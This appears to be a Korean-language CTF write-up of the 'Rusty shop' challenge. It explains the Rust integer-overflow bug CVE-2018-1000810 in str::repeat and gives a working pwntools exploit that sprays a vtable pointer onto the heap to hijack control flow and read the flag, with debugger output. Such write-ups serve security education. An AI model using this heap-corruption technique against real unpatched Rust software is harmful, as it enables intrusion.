# Rusty shop

## Description

```
Our Rust dev doesn't like updating his compiler very often, he says it's too much hassle.

nc challenges.fbctf.com 1342

(note: you'll need to run this on at least a two core machine, but we recommend 4+ cores for optimal results)

Author: pippinthedog
```

---

## 📚​Background

### 1. Rust vector

rust에는 C++의 `vector`와 유사한 `Vec`이 존재한다. 이와 관련된 변수로 `capacity`와 `len`이 있다. C++ 벡터의 변수들과 비슷한 역할을 한다.

- `capacity` : 벡터에 재할당 없이 넣을 수 있는 element의 갯수(벡터가 할당된 메모리의 크기)
- `len` : 벡터에 들어있는 element의 갯수



`vec`를 할당하면, 힙에 `capacity`를 참조하여 메모리를 할당했다가, `capacity`를 초과하여 element가 들어오려하면 `realloc`을 통해 `vec`을 다시 할당하고, 데이터를 옮긴다.(C++ 벡터와 동작이 비슷함)

---

### 2. CVE-2018-1000810 : Rust integer overflow

> <https://nvd.nist.gov/vuln/detail/CVE-2018-1000810>
>
> <https://github.com/rust-lang/rust/commit/1b94b84ad0143ea2039610e3aec9e929a8a20733>

CVE-2018-100810은 `rust`의 `slice::repeat`, `str::repeat`함수에서 발생하는 취약점으로, `integer overflow`와 관련있다.

영향을 받는 버전은 <u>1.29.0, 1.28.0, 1.27.2, 1.27.1, 1.27.0, 1.26.2, 1.26.1, 1.26.0</u>이다.

---

CVE를 분석하기 전에 1.29.1에서 `slice::repeat`함수가 어떻게 패치됐는지 살펴보자.

```rust
diff --git a/src/liballoc/slice.rs b/src/liballoc/slice.rs 
index c27c596e79..e64ddd0e64 100644 
- - --- a/src/liballoc/slice.rs 
+++ b/src/liballoc/slice.rs 
@@ -417,7 +417,7 @@ impl<T> [T] { 
         // and `rem` is the remaining part of `n`. 

         // Using `Vec` to access `set_len()`. 
- -        let mut buf = Vec::with_capacity(self.len() * n); 
+        let mut buf = 
Vec::with_capacity(self.len().checked_mul(n).expect("capacity 
overflow")); 

         // `2^expn` repetition is done by doubling `buf` `expn`-times. 
         buf.extend(self); 
```

벡터를 할당 할때, `capacity`와 관련된 연산에서 `integer overflow`가 발생하는지 체크하도록 패치됐다.

---

그러면 이제 위 두 취약한 함수가 1.29.0에서 각각 어떻게 구현됐는지 살펴보자.

#### str::repeat

```rust
//https://github.com/rust-lang/rust/blob/1.29.0/src/liballoc/str.rs
...

pub fn repeat(&self, n: usize) -> String {
    unsafe { String::from_utf8_unchecked(self.as_bytes().repeat(n)) }
}

...
```

`str::repeat`는 `slice::repeat`의 wrapper이다. `str`을 byte slice로 만들어서 다시 `repeat`을 호출한다.

---

#### slice::repeat

---

1.29.1에서 패치된 부분과 그 아래 일부만 살펴보자.

```rust
//https://github.com/rust-lang/rust/blob/1.29.0/src/liballoc/slice.rs
pub fn repeat(&self, n: usize) -> Vec<T> where T: Copy {
  
...
    // If `n` is larger than zero, it can be split as
    // `n = 2^expn + rem (2^expn > rem, expn >= 0, rem >= 0)`.
    // `2^expn` is the number represented by the leftmost '1' bit of `n`,
    // and `rem` is the remaining part of `n`.

    // Using `Vec` to access `set_len()`.
    let mut buf = Vec::with_capacity(self.len() * n);

            // `2^expn` repetition is done by doubling `buf` `expn`-times.
            buf.extend(self);
            {
                let mut m = n >> 1;
                // If `m > 0`, there are remaining bits up to the leftmost '1'.
                while m > 0 {
                    // `buf.extend(buf)`:
                    unsafe {
                        ptr::copy_nonoverlapping(
                            buf.as_ptr(),
                            (buf.as_mut_ptr() as *mut T).add(buf.len()),
                            buf.len(),
                        );
                        // `buf` has capacity of `self.len() * n`.
                        let buf_len = buf.len();
                        buf.set_len(buf_len * 2);
                    }

                    m >>= 1;
                }
            }

...
}
```

`Vec::with_capacity`함수의 원형은 다음과 같다.

```rust
pub fn with_capacity(capacity: usize) -> Vec<T>
```

`usize`자료형은 32bit OS에서는 최대 4byte, 64bit OS에서는 최대 8byte의 값을 저장할 수 있다.

따라서 패치된 부분에서 `self.len() * n`의 값이 이 범위를 넘어갈 경우 `integer overflow`가 발생한다.

그 뒤의 루틴을 살펴보면 `bulk copy`를 통해 데이터를 `n`번 복사한다. 이 때, 벡터의 `capacity`가 앞에서의 `integer overflow`에 의해 실제 필요한 크기보다 작게 설정됐다면, 벡터가 있는 힙 영역에서 오버플로우가 발생한다. 이를 이용하여 `heap spray`가 가능할 것이다.

---

## 🔎Analysis

### Version check

`rustc`로 컴파일된 바이너리는 컴파일한 `rustc`의 버전이 스트링으로 바이너리에 포함된다.

```bash
$strings rusty_shop | grep 'version'
...
clang LLVM (rustc version 1.29.0-dev)
...
```

2019/06/15기준으로 `rustc`의 최신 버전은 1.35.0이고, 1.29.0은 1년정도 지난 버전이므로 one-day를 의심해볼 수 있는 부분이다. 1.29.1의 패치노트를 읽어보면, `security note`에 Background에서 소개한 `CVE`에 대한 mitigation만 포함되있으므로, 이를 의심해 볼 수 있다.

```
Version 1.29.1 (2018-09-25)
Security Notes
The standard library's str::repeat function contained an out of bounds write caused by an integer overflow. This has been fixed by deterministically panicking when an overflow happens.

Thank you to Scott McMurray for responsibily disclosing this vulnerability to us.
```

---

### Finding `repeat` call

위의 `CVE`를 트리거할 수 있는지 `repeat`함수를 찾아보면, `checkout`함수에서 이를 발견할 수 있다.

```c++
void __cdecl check_out(alloc::vec::Vec<rusty_shop::BasketItem> *basket)
{
    ...
    alloc::fmt::format(&v28, &v30);
    v57 = 1;
    v27 = v29;
    v26 = v28;
    v8 = _alloc::string::String_as_core::ops::deref::Deref_::deref(&v26, (alloc::string::String *)&v30);
    alloc::str::_impl_str_::repeat(&v35, v8, v9, v25[1].RUST$ENCODED$ENUM$0$None.__0); //here 0x30F10E
    v6 = (core::slice::Iter<rusty_shop::BasketItem> *)&v35;
    _alloc::vec::Vec_T__::push_2(&v15, v13);
    v57 = 0;
    core::ptr::drop_in_place_46((alloc::string::String *)&v26);
    v57 = 0;
    ...
}
```

이 함수 호출이 하는 역할은 `basket`에 포함된 `item`의 `name`을 `count`만큼 이어붙인 스트링을 만드는 것이다. 그리고 `name`과 `count`는 모두 우리가 조작할 수 있는 값이다.

만약 `count`*`len(name)`이 `usize` 자료형의 최대 값인 `0xffffffffffffffff(8byte)`을 초과하게 되면, `CVE`를 트리거할 수 있을것이다.

<u>따라서 우리는 원하는 값(name)을 힙에 스프레이할 수 있다.</u>

---

### Some interesting point

`exploit`을 쉽게하기 위한 몇몇 장치가 보인다.

```c++
// rusty_shop::win
void __cdecl rusty_shop::win()
{
  system("cat /home/rusty_shop/flag");
}
```

```asm
.data.rel.ro:0000000000701E40 _ZN10rusty_shop4FUNC17h691c840a26d656e2E dq offset rusty_shop__win
```

---

## 🔨Attack

위의 `CVE`를 다음 스크립트로 한 번 테스트해보자.

```python
from pwn import *

count = 0x10000000000000000/8 + 1

check=''

p = process("./rusty_shop")

p.sendlineafter("6","1")
p.sendlineafter("Name",p64(0x31313131))
p.sendlineafter("Desc","ATTACK")
p.sendlineafter("Price","1")
p.sendlineafter("6","4")
p.sendlineafter("add","1")
p.sendlineafter("Count",str(count))
pause()
p.sendlineafter("6","6")

p.interactive()
```



다음과 같은 `SIGSEGV`를 확인할 수 있다.

```assembly
[----------------------------------registers-----------------------------------]
RAX: 0x31313131 ('1111')
RBX: 0x7f8af67fec30 --> 0x0 
RCX: 0x7f8af600d030 --> 0x31313131 ('1111')
RDX: 0x2 
RSI: 0x2 
RDI: 0x31313131 ('1111')
RBP: 0x0 
RSP: 0x7f8af67fe950 --> 0x2 
RIP: 0x30cd35 (<core::ptr::drop_in_place+21>:        mov    rdi,QWORD PTR [rdi])
R8 : 0x7f8af6a00080 --> 0xc8000000c8 
R9 : 0x0 
R10: 0x90f3d0 --> 0x7f8af6a00080 --> 0xc8000000c8 
R11: 0x7f8af6f02f90 --> 0xfffda370fffda09f 
R12: 0x0 
R13: 0x7fffced5c36f --> 0x7f8af682002000 
R14: 0x7f8af67fec38 --> 0x0 
R15: 0x7fffced5c470 --> 0x7f8af65fe700 (0x00007f8af65fe700)
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x30cd29 <core::ptr::drop_in_place+9>:    mov    rdi,QWORD PTR [rsp+0x10]
   0x30cd2e <core::ptr::drop_in_place+14>:   mov    rax,QWORD PTR [rdi]
   0x30cd31 <core::ptr::drop_in_place+17>:   mov    rdi,QWORD PTR [rdi+0x8]
=> 0x30cd35 <core::ptr::drop_in_place+21>:   mov    rdi,QWORD PTR [rdi]
   0x30cd38 <core::ptr::drop_in_place+24>:   mov    QWORD PTR [rsp+0x8],rdi
   0x30cd3d <core::ptr::drop_in_place+29>:   mov    rdi,rax
   0x30cd40 <core::ptr::drop_in_place+32>:   mov    rax,QWORD PTR [rsp+0x8]
   0x30cd45 <core::ptr::drop_in_place+37>:   call   rax
[------------------------------------stack-------------------------------------]
0000| 0x7f8af67fe950 --> 0x2 
0008| 0x7f8af67fe958 --> 0x7f8af600d020 --> 0x31313131 ('1111')
0016| 0x7f8af67fe960 --> 0x7f8af600d020 --> 0x31313131 ('1111')
0024| 0x7f8af67fe968 --> 0x2 
0032| 0x7f8af67fe970 --> 0x7f8af600d020 --> 0x31313131 ('1111')
0040| 0x7f8af67fe978 --> 0x30cea3
0048| 0x7f8af67fe980 --> 0x7f8af600e000 --> 0x31313131 ('1111')
0056| 0x7f8af67fe988 --> 0x7f8af600d020 --> 0x31313131 ('1111')
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
gdb-peda$ x/gx 0x701e40
0x701e40 <rusty_shop::FUNC::h691c840a26d656e2>: 0x000000000030f620
```

`name`을 `0x701e40`으로 맞추고 `CVE`를 트리거하면 플래그를 딸 수 있음을 알 수 있다. 스크립트를 다음과 같이 고치자.

```python
from pwn import *

#context.log_level = 'debug'
count = 0x10000000000000000/8 + 1

pwin = 0x701e40
check=''

while 'fb' not in check:
    p = remote("challenges.fbctf.com",1342)
    #p = process("./rusty_shop")

    p.sendlineafter("6","1")
    p.sendlineafter("Name",p64(pwin))
    p.sendlineafter("Desc","ATTACK")
    p.sendlineafter("Price","1")
    p.sendlineafter("6","4")
    p.sendlineafter("add","1")
    p.sendlineafter("Count",str(count))
    p.sendlineafter("6","6")

    check = p.recvall()
    print check
```

그리고 실행하고 좀 기다리면 flag를 획득할 수 있다.

```bash
$python ex.py
...
[+] Opening connection to challenges.fbctf.com on port 1342: Done
[+] Receiving all data: Done (49B)
[*] Closed connection to challenges.fbctf.com port 1342
. Check out
fb{s4f3_l4nguag3s_arent_always_safe}
...
```

---

## 🤔Review

왜 이런 공격이 가능했는지 `backtrace`해 보았다. 그 결과 `rusty_shop::detect_hacking`에서 `win`함수가 호출됐음을 알 수 있었다.

```bash
gdb-peda$ backtrace
#0  rusty_shop::win()
#1  0x000000000030cd35 in core::ptr::drop_in_place::h60e9a1ca70b7d49e()
#2  0x000000000030cea3 in core::ptr::drop_in_place::h674069322c64cd87()
#3  0x000000000030b25c in _$LT$alloc..vec..Vec$LT$T$GT$$u20$as$u20$core..ops..drop..Drop$GT$::drop()
#4  0x000000000030d301 in core::ptr::drop_in_place()
#5  0x0000000000315ec7 in rusty_shop::detect_hacking::_$u7b$$u7b$closure$u7d$$u7d$()
#6  0x000000000031dab9 in std::sys_common::backtrace::__rust_begin_short_backtrace()
#7  0x000000000030a116 in std::thread::Builder::spawn::_$u7b$$u7b$closure$u7d$$u7d$::_$u7b$$u7b$closure$u7d$$u7d$()
#8  0x000000000031aa69 in _$LT$std..panic..AssertUnwindSafe$LT$F$GT$$u20$as$u20$core..ops..function..FnOnce$LT$$LP$$RP$$GT$$GT$::call_once()
#9  0x000000000031032b in std::panicking::try::do_call
#10 0x000000000036a26a in __rust_maybe_catch_panic ()
#11 0x0000000000310174 in std::panicking::try()
#12 0x000000000031aaa9 in std::panic::catch_unwind()
#13 0x0000000000309ca6 in std::thread::Builder::spawn::_$u7b$$u7b$closure$u7d$$u7d$()
#14 0x000000000030a28d in _$LT$F$u20$as$u20$alloc..boxed..FnBox$LT$A$GT$$GT$::call_box()
#15 0x0000000000326b7b in std::sys_common::thread::start_thread()
#16 0x0000000000322e26 in std::sys::unix::thread::Thread::new::thread_start()
#17 0x00007f8af73556ba in start_thread
#18 0x00007f8af6e7541d in clone ()
```

---

`detect_hacking` closure는 `run_shop`과 다른 `thread`에서 작동한다.

```cpp
// rusty_shop::detect_hacking
void __cdecl rusty_shop::detect_hacking()
{
  closure v0; // si
  __int64 v1; // [rsp+0h] [rbp-28h]

  std::thread::spawn_0((std::thread::JoinHandle<()>_0 *)&v1, v0);
  core::ptr::drop_in_place_59((std::thread::JoinHandle<()>_1 *)&v1);
}

// rusty_shop::run_shop
std::thread::JoinHandle<()>_2 *__cdecl rusty_shop::run_shop(std::thread::JoinHandle<()>_2 *retstr)
{
  closure v1; // si

  std::thread::spawn((std::thread::JoinHandle<()>_0 *)retstr, v1);
  return retstr;
}
```

---

`detect_hacking` closure는 다음과 같이 구현됐다.

```cpp
// rusty_shop::detect_hacking::{{closure}}
void __cdecl __noreturn rusty_shop::detect_hacking::__closure__(closure a1)
{
  while ( 1 )
  {
    _alloc::vec::Vec_T__::with_capacity_0(&self, 2uLL);
    value_8 = alloc::alloc::exchange_malloc(0LL, 1uLL);
    _alloc::vec::Vec_T__::push(&self, (rusty_shop::Box<NamedCanary>)__PAIR128__(&vtable_3, (unsigned __int64)value_8));
    ...
    core::ptr::drop_in_place_45(&self); //here
  }
}
```

`backtrace`결과를 살펴보면, 마지막 줄에서 `core::ptr::drop_in_place_45`를 호출하는 과정에서 `win`함수가 호출됐다. `ptr::drop_in_place`는 컴파일과정에서 내용이 결정된다고 한다. 함수의 인자에 따라 다양한 형식으로 컴파일되는 것 같다.

```rust
#[stable(feature = "drop_in_place", since = "1.8.0")]
#[inline(always)]
pub unsafe fn drop_in_place<T: ?Sized>(to_drop: *mut T) {
    real_drop_in_place(&mut *to_drop)
}

// The real `drop_in_place` -- the one that gets called implicitly when variables go
// out of scope -- should have a safe reference and not a raw pointer as argument
// type.  When we drop a local variable, we access it with a pointer that behaves
// like a safe reference; transmuting that to a raw pointer does not mean we can
// actually access it with raw pointers.
#[lang = "drop_in_place"]
#[allow(unconditional_recursion)]
unsafe fn real_drop_in_place<T: ?Sized>(to_drop: &mut T) {
    // Code here does not matter - this is replaced by the
    // real drop glue by the compiler.
    real_drop_in_place(to_drop)
}
```

---

그래서 IDA에서 컴파일된 해당 `drop_in_place`를 살펴봤다.(길이가 너무 길어져서 중요부분 빼고 전부 생략) .그 결과 `Vec`는 자체적인 `drop`메소드를 호출하고, 그 내부에서는 힙에 쓰여진 `vtable` 포인터를 참조하여 `vtable`의 함수를 호출하고 있다!

```cpp
// core::ptr::drop_in_place
void __cdecl core::ptr::drop_in_place_45(alloc::vec::Vec<alloc::boxed::Box<NamedCanary>> *a1)
{
  _alloc::vec::Vec_T__as_core::ops::drop::Drop_::drop(a1);
  ...
}

// <alloc::vec::Vec<T> as core::ops::drop::Drop>::drop
void __cdecl _alloc::vec::Vec_T__as_core::ops::drop::Drop_::drop(alloc::vec::Vec<alloc::boxed::Box<NamedCanary>> *self)
{
  ...
  core::ptr::drop_in_place_29(v3);
}

// core::ptr::drop_in_place
void __cdecl core::ptr::drop_in_place_29(_mut__alloc::boxed::Box<NamedCanary>_ a1)
{
  ...
  for ( i = a1.data_ptr; i != &a1.data_ptr[a1.length]; ++i )
  {
    v1 = i;
    core::ptr::drop_in_place_27(v1);
  }
}

// core::ptr::drop_in_place
// local variable allocation has failed, the output may be wrong!
void __cdecl core::ptr::drop_in_place_27(rusty_shop::Box<NamedCanary> *a1)
{
  ...
  ((void (__fastcall *)(u8 *))(*a1->vtable)[0])(a1->pointer); //here!
  ...
}

```

---

이제까지 살펴본 내용을 요약하면 다음과 같다.

1. Multi thread로 `detect_hacking` 클로져와, `run_shop`클로져가 동시에 돌아간다.
2. `detect_hacking`클로져에서는 무한 루프를 돌며 `Vec`를 할당하고 해제하는데, 이 때 힙에 있는 `vtable`포인터를 참조한다. 그런데 할당과 해제 사이에 꽤나 많은 연산이 들어있다.

내용을 정리하면 `TOCTOU`로 공격이 성공했음을 알 수 있다. `detect_hacking`에서 `Vec`를 할당하고, 해제하기 전에 `run_shop` thread에서 해당 `Vec`의 `vtable`포인터를 덮으면서 공격이 성공한 것이다. ​아마 ​대부분 ​`​CV​E​`​를 ​발견하고 ​적당히 ​디버깅하다가 ​풀지 ​않았을까 싶다.:triangular_flag_on_post: